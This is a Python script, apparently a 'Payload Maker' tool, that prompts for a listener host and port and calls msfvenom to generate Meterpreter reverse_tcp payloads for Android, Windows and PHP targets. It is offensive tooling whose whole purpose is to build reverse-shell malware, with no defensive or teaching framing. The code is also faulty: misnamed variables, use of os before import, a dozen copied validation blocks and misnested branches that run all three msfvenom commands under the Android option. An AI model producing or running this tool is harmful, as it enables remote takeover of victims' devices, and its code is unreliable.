import sys
def platform1():
    platforms = {
        'linux1' : 'Linux',
        'linux2' : 'Linux',
        'darwin' : 'OS X',
        'win32' : 'Windows'
    }
    if sys.platform not in platforms:
        return sys.platform
    
    return platforms[sys.platform]
if platform1()== "Linux":
	pass
else:
	print("This software is only for Linux os sorry")
	sys.exit()
if sys.version_info.major < 3:
	print("Payload Maker supports only Python3. Rerun application in Python3 environment.")
	install = input("you want to install Python3? [yes / no] : ")
	if intall.lower()=="yes" or install.lower()=="y":
		os.system("sudo apt update && sudo apt-get install python")
import os
option=["1","2","3","99","exit"]
def payload():
	print("(1)Make Paylaod for Android.")
	print("(2)Make Payload for Windows.")
	print("(3)Make PHP Payload.")
	print("(99)Exit.")
	platform=input("Answer : ")
	if platform in option:
		pass
	else:
		print("Please type correct option.")
		platform=input("Answer : ")
	if platform in option:
    		pass
	else:
		print("Please type correct option.")
		platform=input("Answer : ")
	if platform in option:
    		pass
	else:
		print("Please type correct option.")
		platform=input("Answer : ")
	if platform in option:
    		pass
	else:
		print("Please type correct option.")
		platform=input("Answer : ")
	if platform in option:
    		pass
	else:
		print("Please type correct option.")
		platform=input("Answer : ")
	if platform in option:
    		pass
	else:
		print("Please type correct option.")
		platform=input("Answer : ")
	if platform in option:
    		pass
	else:
		print("Please type correct option.")
		platform=input("Answer : ")
	if platform in option:
    		pass
	else:
		print("Sorry you can't use this software.")
		sys.exit
	os.system("ifconfig")
	while True:
		lhost=input("Type your localhost show in display i.e 192.168.10.1 : ")
		if lhost:
			while True:
				lport=input("Type localport i.e 4444 : ")
				if lport:
					name=input("Type the name of your payload i.e payload.apk/.exe/.php : ")
					if name:
						location=input("Type location of your payload i.e /root/Desktop.. : ")
						if location:
							break
						else:
							location = (f"/root/Desktop/{name}")
							print("your payload save will in your desktop.")
							break
					else:
						name="payload"
						break
					
				else:
					print("localport is important! Please type your localport.")
					continue
			break
					
		else:
			print("localhost is important! Please type your localhost.")
			continue
	if platform=="1":
		if ".apk" not in name:
			name=name+".apk"
		os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={lhost} lport={int(lport)} > {location}")
		if platform=="2":
			if ".exe" not in name:
				name=name+".exe"
			else:
				name=name
		os.system(f"msfvenom -p windows/meterpreter/reverse_tcp lhost={lhost} lport={int(lport)} > {location}")
		if platform=="3":
			if ".php" not in name:
				name=name+".php"
			else:
				name=name
		os.system(f"msfvenom -p php/meterpreter/reverse_tcp lhost={lhost} lport={int(lport)} > {location}")
		if platform=="99" :
			sys.exit()
		else:
			print("Please type correct option")
			sys.exit()
			
try:		
	while True:
		ans=input("You want to make payload for windows, android phone or php payload [yes / no]: ")
		if ans.lower()=="yes" or ans.lower()=="y":
			payload()	
			break
		elif ans.lower()=="no" or ans.lower()=="n":
			sys.exit()
except UnboundLocalError:
	pass
	

